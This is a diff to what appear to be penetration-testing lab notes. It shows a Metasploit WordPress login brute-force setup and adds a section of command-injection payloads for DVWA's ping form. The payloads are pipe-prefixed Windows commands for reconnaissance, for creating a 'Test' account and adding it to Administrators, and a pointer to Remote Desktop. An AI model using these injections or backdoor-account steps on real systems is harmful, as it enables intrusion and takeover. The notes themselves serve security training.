@@ -308,7 +308,22 @@ msf auxiliary(wordpress_login_enum) > set targeturi /wordpress
 msf auxiliary(wordpress_login_enum) > set user_file user.txt
 msf auxiliary(wordpress_login_enum) > set pass_file pass.txt
 msf auxiliary(wordpress_login_enum) > exploit
-  
-  
+    
 ```
+### 4) RCE
+- In DVWA application to ping.
+```bash
+| hostname  //name of target machine
+| whoami   // user,groups,privileges
+| tasklist  //lists running process
+| dir C:\
+| net user
+| net user Test /Add
+| net user 
+| net user Test //displays info about user Test
+| net localgroup Administrators Test /Add
+| net user Test //now it's in Administrator
+
+```
+- To launch Remote Desktop Connection, navigate to ```Start--> Windows Accessories--> Remote Desktop Connection```
 </details>
